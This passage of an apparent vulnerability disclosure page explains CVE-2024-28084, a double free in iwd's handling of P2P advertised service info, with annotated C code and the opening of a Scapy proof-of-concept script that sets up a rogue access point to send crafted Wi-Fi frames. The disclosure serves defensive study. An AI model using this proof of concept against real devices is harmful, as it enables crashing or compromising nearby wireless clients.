punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">group_clients</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">ADVERTISED_SVC_INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">advertised_svcs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">r </span><span class="token operator">&gt;=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token function" style="color:rgb(80, 250, 123)">memcpy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">sizeof</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_probe_resp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>While parsing this attribute in <code>extract_p2p_advertised_service_info()</code>, errors in processing will result in the queue pointer allocated at [3] to be released [4]:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">static</span><span class="token plain"> bool </span><span class="token function" style="color:rgb(80, 250, 123)">extract_p2p_advertised_service_info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">const</span><span class="token plain"> </span><span class="token class-name">uint8_t</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">l_queue</span><span class="token plain"> </span><span class="token operator">*</span><span class="token operator">*</span><span class="token plain">out </span><span class="token operator">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">p2p_advertised_service_descriptor</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">desc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> name_len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">len </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">goto</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		name_len </span><span class="token operator">=</span><span class="token plain"> attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">6</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">len </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">7u</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> name_len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">goto</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">!</span><span class="token function" style="color:rgb(80, 250, 123)">l_utf8_validate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> attr </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> name_len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token constant" style="color:rgb(189, 147, 249)">NULL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">goto</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">!</span><span class="token operator">*</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token operator">*</span><span class="token plain">out </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">l_queue_new</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">error</span><span class="token operator">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">l_queue_destroy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">*</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> p2p_clear_advertised_service_descriptor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>However when the parent function finishes, <code>p2p_clear_probe_resp()</code> will also free [2] the <code>advertised_svcs</code> data structures.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_probe_resp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">p2p_probe_resp</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_notice_of_absence_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">notice_of_absence</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_device_info_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">device_info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_group_info_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">group_clients</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_advertised_service_info_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">advertised_svcs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="scapy-poc">Scapy POC<a href="#scapy-poc" class="hash-link" aria-label="Direct link to Scapy POC" title="Direct link to Scapy POC">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">CVE-2024-28084 beacon double free vulnerability due to error handling in extract_p2p_advertised_service_info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">layers</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dot11 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">arch </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> str2mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> get_if_raw_hwaddr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> time </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sleep</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">if_hwaddr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iff</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> str2mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">get_if_raw_hwaddr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iff</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">config_mon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;set the interface in monitor mode and then change channel using iw&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ip link set dev %s down&quot;</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;iw dev %s set type monitor&quot;</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ip link set dev %s up&quot;</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;iw dev %s set channel %d&quot;</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">AP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mac</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;stdio&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;wlan0&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">channel </span><span class="token operator">=</span><span class="token plain"> channel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">iface </span><span class="token operator">=</span><span class="token plain"> iface</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">=</span><span class="token plain"> mode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;iface&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">              mac </span><span class="token operator">=</span><span class="token plain"> if_hwaddr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            config_mon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> Exception</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Need a mac&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mac </span><span class="token operator">=</span><span class="token plain"> mac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">get_radiotap_header</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> RadioTap</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" 